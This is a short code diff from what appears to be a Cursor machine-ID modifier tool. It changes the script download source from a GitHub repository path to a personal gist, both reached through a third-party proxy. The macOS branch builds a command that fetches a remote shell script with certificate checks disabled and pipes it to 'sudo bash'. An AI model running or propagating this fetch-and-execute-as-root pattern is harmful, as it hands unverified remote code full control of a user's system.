@@ -8,7 +8,7 @@ def go_cursor_help():
     system = platform.system()
     logging.info(get_translation("current_operating_system", system=system))
     
-    base_url = "https://aizaozao.com/accelerate.php/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run"
+    base_url = "https://aizaozao.com/accelerate.php/https://gist.githubusercontent.com/cybernobie/ed3d313f7e2a31fe349437eace4a27be/raw"
     
     if system == "Darwin":  # macOS
         cmd = f'curl -k -fsSL {base_url}/cursor_mac_id_modifier.sh | sudo bash'
